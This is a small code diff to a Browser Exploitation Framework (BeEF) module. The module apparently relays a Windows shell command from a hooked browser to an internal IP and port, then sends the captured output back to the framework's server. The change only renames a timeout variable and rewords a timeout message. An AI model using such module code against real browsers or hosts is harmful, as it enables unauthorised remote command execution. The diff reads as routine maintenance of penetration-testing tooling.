@@ -18,7 +18,7 @@ beef.execute(function() {
 	var target_ip = "<%= @ip %>";
 	var target_port = "<%= @port %>";
 	var cmd = "<%= @cmd %>";
-	var command_timeout = "<%= @command_timeout %>";
+	var timeout = "<%= @command_timeout %>";
 	var internal_counter = 0;
 
 	cmd += " & echo __END_OF_WIN_IPC<%= @command_id %>__ & echo </pre>\"\" & echo <div id='ipc_content'>\"\"";
@@ -66,8 +66,8 @@ beef.execute(function() {
 			} else throw("command results haven't been returned yet");
 		} catch (e) {
 			internal_counter++;
-			if (internal_counter > command_timeout) {
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=time out');
+			if (internal_counter > timeout) {
+				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Timeout after '+timeout+' seconds');
 				document.body.removeChild(iframe);
 				return;
 			}
